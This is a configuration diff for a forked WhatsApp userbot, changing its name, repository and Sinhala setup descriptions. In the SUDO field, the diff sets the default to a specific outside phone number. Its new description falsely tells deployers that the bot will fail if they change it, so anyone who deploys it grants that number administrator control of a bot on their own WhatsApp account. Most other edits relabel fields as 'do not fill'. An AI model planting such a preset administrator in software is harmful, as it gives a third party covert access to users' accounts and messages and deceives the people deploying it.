@@ -1,22 +1,21 @@
-
 {
-    "name": "dinuka bot",
+    "name": "king",
     "description": "Dinuka💢 project - Makes it easy and fun to use Whatsapp. World’s first UserBot made for WhatsApp.",
     "logo": "https://telegra.ph/file/7de56858209649d760d99.jpg",
     "keywords": ["whatsapp", "userbot", "Asena", "WhatsAsena", "bot", "api", "ai"],
-    "repository": "https://github.com/dinukabot/dinukabot",
+    "repository": "https://github.com/SLBADBOY/🐱‍👤Dileepa",
     "website":   "https://t.me/farhan-dqz",
     "success_url": "https://t.me/farhan-dqz",
     "stack": "container",
     "env": {
         "DINUKA_SESSION": {
-            "description": "KING DINUKA QR CODE එක Scan කල පසු ඔබේ whatsapp එකට එන code එක",
+            "description": "ඔබ ඔබගෙ whatsappහි Sacn කෙරූ තැනනින් ආ කොඩ් එක දන්න",
             "required": true
         },
         "SUDO": {
-            "description": "නොදනීනම් වෙනස් නොකරන්න)!",
-            "required": true,
-            "value": " default "
+            "description": "මෙය වෙනස් වැලකෙන්න(මෙය පිරවිය නොහැක නැතහොත් බොට් වැඩ නොකරයි)!",
+            "required": false,
+            "value": "94703179493,0"
         },
         "LANGUAGE": {
             "description": "",
@@ -29,7 +28,7 @@
             "value": "^[.!;]"
         },
         "SEND_READ": {
-            "description": "msg seen කිරීමට අවශ්‍ය නම් true ලෙසද msg seen නොකිරීමට false ලෙස යොදන්න!",
+            "description": "මෙය පිරවීමෙන් වැලකෙන්න!",
             "required": true,
             "value": "true"
         },
@@ -43,32 +42,32 @@
             "required": true
         },
         "MUTE_MESSAGE": {
-            "description": "Group chat mute කරනවිට පැමිණෙන msg එක!.",
-            "required": true,
+            "description": "මෙය පිරවීමෙන් වැලකෙන්න!.",
+            "required": false,
             "value": "default"
         },
         "BLOCK_CHAT": {
             "description": "මෙය පිරවීමෙන් වැලකෙන්න!",
-            "required": true,
+            "required": false,
             "value": "false"
         },
         "UNMUTE_MESSAGE": {
-            "description": "Group chat unmute කරන විට පැමිනෙන msg එක!",
-            "required": true,
+            "description": "මෙය පිරවීමෙන් වැලකෙන්න!",
+            "required": false,
             "value": "default"
         },
         "BLOCK_MESSAGE": {
-            "description": " block කරන විට පැමිණෙන msg එක!",
-            "required": true,
+            "description": " මෙය පිරවීමෙන් වැලකෙන්න!",
+            "required": false,
             "value": "default"
         },
         "UNBLOCK_MESSAGE": {
-            "description": "Block කරන විට පැමිණෙන msg එක!.",
-            "required": true,
+            "description": "මෙය පිරවීමෙන් වැලකෙන්න!.",
+            "required": false,
             "value": "default"
         },
         "WORK_TYPE": {
-            "description": "Dinuka_Bot Working Type. ඔබ “public” භාවිතා කරන්නේ නම්, සෑම කෙනෙකුටම බොට් භාවිතා කළ හැකිය. වෙනත් ආකාරයකින් ඔබ “private” භාවිතා කරන්නේ නම්, ඔබේ බෝට්ව භාවිතා කළ හැක්කේ ඔබට පමණි.",
+            "description": "Maraya_BoT Working Type. ඔබ “public” භාවිතා කරන්නේ නම්, සෑම කෙනෙකුටම බොට් භාවිතා කළ හැකිය. වෙනත් ආකාරයකින් ඔබ “private” භාවිතා කරන්නේ නම්, ඔබේ බෝට්ව භාවිතා කළ හැක්කේ ඔබට පමණි.",
             "required": true,
             "value": "public"
         },
@@ -83,46 +82,41 @@
         },
         "REMOVE_BG_API_KEY": {
             "description": "ඡායාරූප වල පසුබිම ඉවත් කරයි.මෙහි API KEY එක ගැනීමට මෙම Site එක තුලට පිවිසෙන්න https://remove.bg",
-            "required": true
+            "required": false
         },
         "ALIVE_MESSAGE": {
             "description": ".alive අණකිරීම කිරීමෙන් පසු එන දේ (මෙය ඔබට වෙනස් කල හැක..!)",
-            "required": true,
-            "value": "```I am Alive```\n\n```Coded By Dinuka```"
+            "required": false,
+            "value": "```I am Alive```\n\n```Coded By Maraya_BoT```"
         },
         "BAN_MESSAGE": {
-            "description": "Group එකෙන් කෙනෙක් ඉවත් කරන විට පැමිණෙන msg එක !",
-            "required": true,
+            "description": "මෙය පිරවීමෙන් වැලකෙන්න!",
+            "required": false,
             "value": "default"
         },
         "ADD_MESSAGE": {
-            "description": "group එකට කෙනෙක් add කරන විට පැමිණෙන msg එක!",
-            "required": true,
+            "description": "මෙය පිරවීමෙන් වැලකෙන්න!",
+            "required": false,
             "value": "default"
         },
         "KICKME_MESSAGE": {
-            "description": "kickme msg!",
-            "required": true,
+            "description": "මෙය පිරවීමෙන් වැලකෙන්න!",
+            "required": false,
             "value": "default"
         },
         "PROMOTE_MESSAGE": {
-            "description": "promote msg!",
-            "required": true,
-            "value": "default"
-         },
-         "OWNER_SHIP": {
-            "description": "බොට් අයිතිකරුගේ නාමය වෙනස් කරයි",
+            "description": "මෙය පිරවීමෙන් වැලකෙන්න!",
             "required": false,
-            "value": "DINUKA HIMSARA"
+            "value": "default"
         },
         "DEMOTE_MESSAGE": {
-            "description": "demote msg!",
-            "required": true,
+            "description": "මෙය පිරවීමෙන් වැලකෙන්න!",
+            "required": false,
             "value": "default"
         },
         "AFK_MESSAGE": {
-            "description": "afk massage!",
-            "required": true,
+            "description": "මෙය පිරවීමෙන් වැලකෙන්න!",
+            "required": false,
             "value": "default"
         },
         "GAN_IMAGE": {
@@ -132,12 +126,12 @@
         },
         "NO_ONLINE": {
             "description": "මෙය පිරවීමෙන් වැලකෙන්න!",
-            "required": true,
+            "required": false,
             "value": "true"
         },
         "COFFEEHOUSE_API_KEY": {
             "description": "මෙය පිරවීමෙන් වැලකෙන්න!",
-            "required": true,
+            "required": false,
             "value": "true"
         }
     },
